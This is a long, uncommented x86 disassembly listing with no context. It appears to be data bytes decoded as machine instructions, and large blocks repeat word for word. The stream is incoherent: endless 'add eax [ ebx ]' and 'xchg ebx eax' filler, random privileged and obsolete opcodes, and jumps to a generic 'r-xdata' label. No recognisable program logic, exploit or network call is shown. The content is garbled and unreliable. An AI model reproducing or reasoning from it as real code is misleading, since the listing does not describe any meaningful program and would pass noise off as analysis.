add ebx [ edi + edx + 0x6c6c6bf7 ]
jpe r-xdata
add eax [ ebx ]
add ecx eax
jpe r-xdata
xchg esp eax
xchg ebx eax
and eax 0x41d61af5
mov al [ 0xffffffffbcec7a48 ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax eax
jpe r-xdata
into
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
dec esp
inc eax
push 0xd19b5510
sbb ecx edi
xchg [ eax ] dh
adc [ ebp - 0x4d ] ch
pushfd
adc ecx eax
fist [ ebx - 0x72ff856d ]
xchg ebx eax
xchg ebx eax
jpe r-xdata
mov al [ 0x505acc53 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx ebx
stc
div ebp
sbb dl dh
jpo r-xdata
xchg ebx eax
add eax [ ebx ]
add ebx [ eax ]
salc
imul ebx [ esi ] 0xffffffde
jae r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
cmc
adc al ch
aad 0x93
div ebp
sbb bl dh
inc ebx
0xe4f9
pushad
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax eax
inc ecx
mov esi 0x53a09393
int3
add eax [ ebx ]
add eax [ ebx ]

xlat
xchg ebx eax
xchg ebx eax
add edi [ edx + 0x76 ]
jg r-xdata
pushfd
pop ss
0x1093939b 0xb7ef
xchg [ ebx - 0x6c6b9586 ] edx
xchg ebx eax
stc
cmc
sbb dl dh
jns r-xdata
add eax [ ebx ]
add eax [ ebx ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
jpe r-xdata
adc bh ch
mov bh 0x87
xchg ebx eax
jpe r-xdata
stc
hlt
sub_46435d
cmc
sbb bl dh
inc ecx
jpe r-xdata
jpe r-xdata
scasb [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb dh dl
fwait
jpe r-xdata
div ebp
sbb bl dh
inc ebx
0xe4f9
mov [ 0x3039393 ] eax
add eax [ ebx ]
add eax [ ebx ]
add ecx esp
jpe r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
mov eax [ 0x3039393 ]
add eax [ ebx ]
add ebx [ eax ]
fcomp [ edi + 0x179c5a16 ]
or [ ebp + 0x6c ] esp
insb
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
imul ebp [ esp + ebp * 2 + 0x3 ] 0x3030303
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ ebx - 0x53 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ ebx + 0x3030393 ] 0x3
add eax [ ebx ]
add esi ebp
sbb dl bh
mov bh 0xaf

test al 0x93
xchg ebx eax
rcr [ esi ] 0x16
aas
insb
insb
retn
sub_4643a4
cmpsb [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb ch dh
push ebp
sbb [ ebp - 0xb ] ch
sbb ch dh
pop ebx
mov al [ 0xffffffffee1af56c ]
pop ecx
int3
sub_46444a
pushfd
pop ss
shl [ eax - 0x58856c6d ] cl
mov al 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
xlat
push ds
salc
cmp eax eax
retn
sub_46449a
sbb [ edx + 0x7a ] cl
cmp cl [ eax + 0x3039393 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
0xd17a
push 0x57106c6c
xchg [ edx + 0x25 ] edi
mov al 0x93
xchg ebx eax
add ebx [ esi ]
salc
insb
retn
sub_4644bf
push ebp
salc
insb
xchg ebx eax
jpo r-xdata
sbb cl dh
adc [ ebx - 0x29e13c6d ] 0x2c7ac36c
mov ss [ ebx + 0x3030393 ]
add eax [ ebx ]
add ecx edx
jpe r-xdata
push 0x3036c6c
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
0x3039393 0x1f1e
mov bh 0x33
xchg ecx eax
xchg ebx eax
xchg ebx eax
retn 0x18c3
add edi [ ebx + 0x23 ]
push 0x57106c6c
xchg [ edx + 0x25 ] edi
mov al 0x93
xchg ebx eax
add ebx [ esi ]
salc
insb
retn
mov ecx 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add edi [ ebx - 0x9 ]
outsb
insb
insb
jpe r-xdata
test al 0x93
xchg ebx eax
mov [ 0x3039393 ] al
add eax [ ebx ]
add ebx [ edx ]
into
outsd
insb
lds edx [ edi - 0x6c5a1086 ]
sbb [ ebp + 0x7b ] dl
sbb esp [ esi + 0x6c ]
cmpsd [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
salc
ja r-xdata
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
xchg ebx eax
imul ebp [ esp + ebp * 2 + 0x18 ] 0x63
push ss
jpe r-xdata
add eax [ ebx ]
jpo r-xdata
mov ebx 0xce1a9393
jae r-xdata
jpe r-xdata
push 0x6c
insb
add edx ebx
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
jpo r-xdata
insb
adc [ edi - 0x7d ] dl
adc bh ch
mov bh 0x8f
xchg ebx eax
sbb dl bh
mov bh 0x87
pushfd
pop ss
insb
cmc
test al 0xd5
xchg ebp eax
jpe r-xdata
into
push ss
daa
imul ebp [ esp + ebp * 2 + 0x7a ] 0xffffffa5
cdq
xchg ebx eax
xchg ebx eax
add esp [ eax - 0x373233ad ]
pop edx
push eax
add eax [ ebx ]
pushfd
push ss
scasd [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
push ds
sub_464519
push ebp
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
insb
insb
adc [ edi - 0x7d ] dl
adc bh ch
mov bh 0x8f
xchg ebx eax
sbb dl bh
mov bh 0x87
pushfd
pop ss
test al 0x93
xchg ebx eax
mov [ 0x3039393 ] al
add eax [ ebx ]
add ebx [ edx ]
into
outsd
insb
lds edx [ edi - 0x6c5a1086 ]
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
xchg ebx eax
imul ebp [ esp + ebp * 2 + 0x18 ] 0x63
push ss
jpe r-xdata
jpe r-xdata
push 0x6c
insb
add edx ebx
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
jpo r-xdata
push ss
daa
imul ebp [ esp + ebp * 2 + 0x7a ] 0xffffffa5
cdq
xchg ebx eax
xchg ebx eax
add esp [ eax - 0x373233ad ]
pop edx
push eax
add eax [ ebx ]
pushfd
push ss
scasd [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
push ds
sub_464606
mov [ ebx + 0x69100393 ] dl
0x7b70149c 0x6c6c
adc al 0x70
jpo r-xdata
xchg [ ebx + 0x3030393 ] edx
add eax [ ebx ]
add edi [ edx + 0xa ]
adc [ ebx + 0x3030393 ] 0x3
add eax ebx
insb
in eax 0xc3
sbb cl dh
inc edi
jpe r-xdata
scasb [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
fisubr [ eax - 0xf046c6d ]
je r-xdata
jpe r-xdata
insb
test eax 0xddd383a3
jpe r-xdata
bound ebp [ esp + ebp * 2 + 0x3 ]
push ds
xlat
mov bh 0xab
retn
retn
add al al
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add edi [ ebx - 0xa ]
js r-xdata
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
xchg ebp eax
xchg ebx eax
xchg ebx eax
sti
cmp [ esi - 0x12 ] ah
scasd [ edi ]
rcr [ edx ] 0x15
outsd
jpe r-xdata
push 0x6c
insb
add edx ebx
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add edx [ esi ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
adc [ ebp - 0x69e9636d ] ch
lodsb [ esi ]
xchg ebx eax
xchg ebx eax
mov eax 0x9a357a61
xchg ebx eax
xchg ebx eax
add ecx edx
jpe r-xdata
xchg ebx eax
xchg ebx eax
push ds
salc
inc ebx
jpe r-xdata
xchg ebp eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
test al 0x93
xchg ebx eax
mov [ 0x3039393 ] al
add eax [ ebx ]
add ebx [ edx ]
into
outsd
insb
lds edx [ edi - 0x6c5a1086 ]
add eax [ ebx ]
add eax [ ebx ]
push ds
push ss
daa
imul ebp [ esp + ebp * 2 + 0x7a ] 0xffffffa5
cdq
xchg ebx eax
xchg ebx eax
add esp [ eax - 0x373233ad ]
pop edx
push eax
add eax [ ebx ]
pushfd
push ss
scasd [ edi ]
xchg ebx eax
xchg ebx eax
adc [ ebx + 0x3030393 ] 0x71d61af5

xchg ebx eax
sbb [ esp + ecx * 8 - 0x33 ] dl
jpe r-xdata
mov esi 0x3039393
add eax [ ebx ]
push ss
inc ecx
pushfd
pop edx
pushfd
pop ss
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ss
movsb [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
xchg ebx eax
imul ebp [ esp + ebp * 2 + 0x18 ] 0x63
push ss
jpe r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
les ebx [ edx ]
adc eax 0x93939303
jpo r-xdata
add eax ebx
insb
lds edi [ ebx + 0x6e5b161e ]
xchg esi eax
xchg ebx eax
xchg ebx eax
sti
je r-xdata
out 0xb7 eax
xchg edx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
jpe r-xdata
push ss
mov al [ ebx + edx * 4 - 0x7b7d856d ]
xchg ebx eax
xchg ebx eax
adc esp [ esi - 0x3c ]
sbb dl [ 0xffffffff93939307 ]
jpo r-xdata
jbe r-xdata
js r-xdata
insb
insb
jpe r-xdata
push ds
push ss
pop ebx
outsb
insd
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
in eax 0x18
imul esi ebp 0x1a
out dx al
dec ebp
sbb [ ebp - 0xb ] ch
sbb ch dh
jae r-xdata
xchg esi eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add ebp [ esi - 0x65 ]
push eax
pop ebp
sbb [ eax + eax * 2 + 0x68 ] cl
adc [ ebp - 0x65 ] dl
rcr [ ebx ] 0x1
iretd
insb
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax * 8 - 0x19 ]
jpe r-xdata
jecxz r-xdata
add eax [ ebx ]
cmpsb [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
sti
xchg ebx eax
lds edi [ ebx + 0x68 ]
movsb [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
jpo r-xdata
scasb [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb bh ch
push ds
jpo r-xdata
xchg ebx eax
add esi ebp
push ds
salc
inc edi
retn
test [ ebx + 0x3030393 ] edx
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx - 0x21 ]
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg ebx eax
xchg ebx eax
add ebx [ eax ]
salc
outsd
pushfd
and al 0x97
rcr [ eax ] 0x1
xchg edi eax
adc al 0x90
insb
stc
xchg ebx eax
insb
add eax 0x9393933f
jpe r-xdata
insb
insb
push ss
push ebx
pushfd
push ss
sahf
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
jpe r-xdata
fwait
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
sbb [ gs : ebp + 0x18 ] bl
dec esp
inc eax
push 0xd19b5510
sbb ecx edi
xchg [ edx + edi * 2 ] dh
xchg ebp eax
xchg edx eax
xchg ebx eax
xchg ebx eax
add edx [ esi ]
pop edx
pushfd
push ss
aaa
insb
insb
jpe r-xdata
push ds
salc
iretd
mov ch 0x93
xchg ebx eax
add ebp [ ebp + eax * 8 - 0x65 ]
mov al [ 0xffffffffe8aad46c ]
mov ebx 0x655d169c
insb
insb
jpo r-xdata
lodsd [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
insd
insb
mov [ 0xffffffffa87a9393 ] eax
jl r-xdata
salc
fwait
jpe r-xdata
js r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax esi
sbb [ edi + 0x12 ] bh
jg r-xdata
jbe r-xdata
mov bh 0x9c
push ss
out 0x8a eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
bound ebp [ esp + ebp * 2 + 0x3 ]
add eax [ ebx ]
insb
out 0x9b al
dec eax
jpe r-xdata
xchg [ ebx + 0x7ae3f993 ] edx
insb
add eax [ ebx ]
push ss
pop edx
jpe r-xdata
add eax [ ebx ]
sbb [ ebp + 0x6c ] ch
insb
push ss
push ebx
pushfd
pop ss
out 0x7c eax
insb
xchg ebx eax
stc
jecxz r-xdata
nop
xchg ebx eax
xchg ebx eax
rol ch 0xa0
dec eax
les ebx [ eax ]
enter 0x1af5 0xce
insd
stc
dec al
cmc
sbb cl dh
xchg ebx eax
jpe r-xdata
insb
add eax [ ebx ]
cmc
sbb dl dh
jpe r-xdata
add eax [ ebx ]
add ecx eax
sbb [ esi - 0x32 ] dh
xchg ebx eax
movsb [ edi ] [ esi ]
xchg ebx eax
sbb cl dh
and [ eax - 0x5bfc85b8 ] 0xffffff93
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
mov edi 0x3039393
add eax [ ebx ]
add eax [ ebx ]
imul edi [ edx - 0x79 ] 0xffffffbc
jle r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sti
ja r-xdata
xchg ebx eax
popfd
xchg ebx eax
xchg ebx eax
retn 0xd57a
jl r-xdata
xchg edi eax
xchg ebx eax
xchg ebx eax
adc [ edi - 0x2d ] dl
sti
insd
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax esp
scasb [ edi ]
xchg ebx eax
xchg ebx eax
adc [ ebp - 0x4d ] ch
pushfd
adc [ ebp + 0x6d ] ecx
insb
insb
jpe r-xdata
xchg ebx eax
insb
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
insb
jpe r-xdata
insb
cmc
sbb dl dh
cmp eax 0xd61e5d18
pop edi
cmc
sbb ah dh
aas
sbb dh ah
fwait
jpe r-xdata
dec esp
cmc
sbb cl dh
mov bh 0x93
inc ebx
xchg esp eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
add edi ebx
xchg esi eax
xchg ebx eax
xchg ebx eax
0x1ac5
add ebx [ ebx + 0x167a9393 ]
mov edx 0x3039393
insb
add al 0x37
xchg ebx eax
xchg ebx eax
xchg ebx eax
mov al [ 0x687acd53 ]
jpe r-xdata
pushfd
xchg ebx eax
xchg ebx eax
add ebp [ ebp + eax + 0x3f ]
xchg ebx eax
xchg ebx eax
sbb dl bh
mov bh 0xa7
jpo r-xdata
xchg ebx eax
adc bh dh
mov bh 0xbf
xchg ebx eax
lds edx [ ebp - 0x29 ]
mov bh 0x87
xchg edx eax
jpo r-xdata
popad
insb
insb
add eax [ ebx ]
add eax [ ebx ]
adc [ edi - 0x35 ] bh
xchg edi eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg ebx eax
neg [ eax ]
xchg edx eax
jpe r-xdata
mov bl 0x93
xchg ebx eax
jpo r-xdata
mov al [ 0x1f7ad353 ]
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
outsd
insb
insb
adc bh dh
mov bh 0xb7
xchg ebx eax
0xd71a
sti
xchg ebx eax
xchg edx eax
xchg ebx eax
xchg ebx eax
stc
xchg ebx eax
insb
add eax 0x9393933f
js r-xdata
shl [ eax + 0x1ac4c553 ] 0xd6
outsd
sbb dl dh
imul ebx [ edx ] 0xffffffd6
sub edx [ bp + di - 0x6c6d ]
rcr [ ecx + esi + 0x6c62587a ] cl
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
pop ss
mov bl 0x93
imul ecx eax 0xfffffff5
sbb cl dh
imul edi ecx 0xf54918f0
sbb cl dh
outsd
insb
add eax [ ebx ]
add eax [ ebx ]
sbb [ ebp + esi * 8 + 0x1a ] cl
into
sub_4646b3
sbb [ edi + 0x10 ] bh
jg r-xdata
push ss
stc
int1
jpe r-xdata
retn
add al al
jpo r-xdata
push ebx
pushfd
pop ss
lodsb [ esi ]
scasb [ edi ]
xchg ebx eax
xchg ebx eax
les ebx [ esp - 0x16e11d79 ]
sub al 0x10
insb
mov bl [ esp + edx - 0x6c6c6c70 ]
adc [ ecx - 0x4d ] dl
cmc
sbb al [ edi - 0x74852a1e ]
scasb [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
fisubr [ eax - 0xf046c6d ]
je r-xdata
push ss
outsd
insb
insb
add eax [ ebx ]
pushfd
push ss
inc edi
lea edx [ ebx + 0x43d61e93 ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
xchg ebp eax
xchg ebx eax
xchg ebx eax
sti
cmp [ esi - 0x12 ] ah
scasd [ edi ]
rcr [ edx ] 0x15
outsd
xchg ebx eax
sbb [ esp + ecx * 8 - 0x33 ] dl
jpe r-xdata
mov esi 0x3039393
add eax [ ebx ]
push ss
inc ecx
pushfd
jpe r-xdata
xchg ebx eax
xchg ebx eax
push ds
salc
inc ebx
xchg ebp eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
les ebx [ edx ]
adc eax 0x93939303
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ss
pop edx
pushfd
pop ss
retn
movsb [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax ebx
insb
lds edi [ ebx + 0x6e5b161e ]
xchg esi eax
xchg ebx eax
xchg ebx eax
sti
je r-xdata
out 0xb7 eax
xchg edx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
jpe r-xdata
push ss
mov al [ ebx + edx * 4 - 0x7b7d856d ]
xchg ebx eax
xchg ebx eax
adc esp [ esi - 0x3c ]
sbb dl [ 0xffffffff93939307 ]
jpo r-xdata
jbe r-xdata
js r-xdata
insb
insb
jpe r-xdata
push ds
push ss
pop ebx
outsb
insd
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
in eax 0x18
imul esi ebp 0x1a
out dx al
dec ebp
sbb [ ebp - 0xb ] ch
sbb ch dh
jae r-xdata
xchg esi eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add ebp [ esi - 0x65 ]
push eax
pop ebp
sbb [ eax + eax * 2 + 0x68 ] cl
adc [ ebp - 0x65 ] dl
rcr [ ebx ] 0x1
iretd
insb
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax * 8 - 0x19 ]
jpe r-xdata
jecxz r-xdata
add eax [ ebx ]
cmpsb [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
sti
xchg ebx eax
lds edi [ ebx + 0x68 ]
movsb [ edi ] [ esi ]
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
jpo r-xdata
scasb [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb bh ch
push ds
jpo r-xdata
xchg ebx eax
add esi ebp
push ds
salc
inc edi
retn
test [ ebx + 0x3030393 ] edx
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx - 0x21 ]
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg ebx eax
xchg ebx eax
add ebx [ eax ]
salc
outsd
pushfd
and al 0x97
rcr [ eax ] 0x1
xchg edi eax
adc al 0x90
insb
stc
xchg ebx eax
insb
add eax 0x9393933f
jpe r-xdata
insb
insb
push ss
push ebx
pushfd
push ss
sahf
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
jpe r-xdata
fwait
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
sbb [ gs : ebp + 0x18 ] bl
dec esp
inc eax
push 0xd19b5510
sbb ecx edi
xchg [ edx + edi * 2 ] dh
xchg ebp eax
xchg edx eax
xchg ebx eax
xchg ebx eax
add edx [ esi ]
pop edx
pushfd
push ss
aaa
insb
insb
jpe r-xdata
push ds
salc
iretd
mov ch 0x93
xchg ebx eax
add ebp [ ebp + eax * 8 - 0x65 ]
mov al [ 0xffffffffe8aad46c ]
mov ebx 0x655d169c
insb
insb
jpo r-xdata
lodsd [ esi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
insd
insb
mov [ 0xffffffffa87a9393 ] eax
jl r-xdata
salc
fwait
jpe r-xdata
js r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax esi
sbb [ edi + 0x12 ] bh
jg r-xdata
jbe r-xdata
mov bh 0x9c
push ss
out 0x8a eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
bound ebp [ esp + ebp * 2 + 0x3 ]
add eax [ ebx ]
insb
out 0x9b al
dec eax
jpe r-xdata
xchg [ ebx + 0x7ae3f993 ] edx
insb
add eax [ ebx ]
push ss
pop edx
jpe r-xdata
add eax [ ebx ]
sbb [ ebp + 0x6c ] ch
insb
push ss
push ebx
pushfd
pop ss
out 0x7c eax
insb
xchg ebx eax
stc
jecxz r-xdata
nop
xchg ebx eax
xchg ebx eax
rol ch 0xa0
dec eax
les ebx [ eax ]
enter 0x1af5 0xce
insd
stc
dec al
cmc
sbb cl dh
xchg ebx eax
jpe r-xdata
insb
add eax [ ebx ]
cmc
sbb dl dh
jpe r-xdata
add eax [ ebx ]
add ecx eax
sbb [ esi - 0x32 ] dh
xchg ebx eax
movsb [ edi ] [ esi ]
xchg ebx eax
sbb cl dh
and [ eax - 0x5bfc85b8 ] 0xffffff93
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
mov edi 0x3039393
add eax [ ebx ]
add eax [ ebx ]
imul edi [ edx - 0x79 ] 0xffffffbc
jle r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sti
ja r-xdata
xchg ebx eax
popfd
xchg ebx eax
xchg ebx eax
retn 0xd57a
jl r-xdata
xchg edi eax
xchg ebx eax
xchg ebx eax
adc [ edi - 0x2d ] dl
sti
insd
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax esp
scasb [ edi ]
xchg ebx eax
xchg ebx eax
adc [ ebp - 0x4d ] ch
pushfd
adc [ ebp + 0x6d ] ecx
insb
insb
jpe r-xdata
xchg ebx eax
insb
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
insb
jpe r-xdata
insb
cmc
sbb dl dh
cmp eax 0xd61e5d18
pop edi
cmc
sbb ah dh
aas
sbb dh ah
fwait
jpe r-xdata
dec esp
cmc
sbb cl dh
mov bh 0x93
inc ebx
xchg esp eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
add edi ebx
xchg esi eax
xchg ebx eax
xchg ebx eax
0x1ac5
add ebx [ ebx + 0x167a9393 ]
mov edx 0x3039393
insb
add al 0x37
xchg ebx eax
xchg ebx eax
xchg ebx eax
mov al [ 0x687acd53 ]
jpe r-xdata
pushfd
xchg ebx eax
xchg ebx eax
add ebp [ ebp + eax + 0x3f ]
xchg ebx eax
xchg ebx eax
sbb dl bh
mov bh 0xa7
jpo r-xdata
xchg ebx eax
adc bh dh
mov bh 0xbf
xchg ebx eax
lds edx [ ebp - 0x29 ]
mov bh 0x87
xchg edx eax
jpo r-xdata
popad
insb
insb
add eax [ ebx ]
add eax [ ebx ]
adc [ edi - 0x35 ] bh
xchg edi eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg ebx eax
neg [ eax ]
xchg edx eax
jpe r-xdata
mov bl 0x93
xchg ebx eax
jpo r-xdata
mov al [ 0x1f7ad353 ]
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
outsd
insb
insb
adc bh dh
mov bh 0xb7
xchg ebx eax
0xd71a
sti
xchg ebx eax
xchg edx eax
xchg ebx eax
xchg ebx eax
stc
xchg ebx eax
insb
add eax 0x9393933f
js r-xdata
shl [ eax + 0x1ac4c553 ] 0xd6
outsd
sbb dl dh
imul ebx [ edx ] 0xffffffd6
sub edx [ bp + di - 0x6c6d ]
rcr [ ecx + esi + 0x6c62587a ] cl
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
pop ss
mov bl 0x93
imul ecx eax 0xfffffff5
sbb cl dh
imul edi ecx 0xf54918f0
sbb cl dh
outsd
insb
add eax [ ebx ]
add eax [ ebx ]
sbb [ ebp + esi * 8 + 0x1a ] cl
into
sub_464abe
mov [ 0x57109393 ] al
sbb [ edx ] 0x15
ja r-xdata
sbb bl dh
jpe r-xdata
xchg ebx eax
xchg ebx eax
push ds
salc
retn
lds edi [ edx + 0x13 ]
insb
insb
enter 0x2e7a 0x62
insb
insb
add eax [ ebx ]
sbb dh cl
sbb [ di + 0x40 ] al
imul ebp [ esi + edx * 8 + 0x67 ] 0x6c64187a
jpe r-xdata
sbb bl dh
sub eax 0xf5e7f9ca
sbb bl dh
push ecx
jpe r-xdata
salc
outsd
insb
add eax [ ebx ]
stc
loopne r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
stc
mov dh 0xf5
sbb dl dh
jg r-xdata
sbb dl dh
sbb dl dh
mov [ ebx + 0x6fd61a93 ] ss
push ss
push ebx
jpe r-xdata
mov al 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
out dx al
mov [ 0xffffffff97fb9393 ] al
xchg edx eax
xchg ebx eax
xchg ebx eax
push ds
pop ss
mov bh 0x7
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
imul ebp [ ebx ] 0xffffff93
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
salc
lds edi [ eax - 0xa346c6d ]
sbb dl dh
jpe r-xdata
0x5316
test al 0x93
xchg ebx eax
add eax [ ebx ]
add esp [ eax + 0x1f7ad353 ]
bound ebp [ esp + ebp * 2 + 0x3 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edi + edx - 0x6c6c4ce9 ]
xchg esi eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
push ecx
xchg ecx eax
cmc
add edi ebx
xchg esi eax
xchg ebx eax
xchg ebx eax
0x1ac5
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax esp
scasb [ edi ]
xchg ebx eax
xchg ebx eax
adc [ ebp - 0x4d ] ch
pushfd
adc [ ebp + 0x6d ] ecx
insb
insb
jpe r-xdata
dec esp
cmc
sbb cl dh
imul ecx eax 0xfffffff5
sbb cl dh
imul edi ecx 0xf54918f0
sbb cl dh
outsd
enter 0x1af5 0xce
insd
stc
dec al
cmc
sbb cl dh
xchg ebx eax
jpe r-xdata
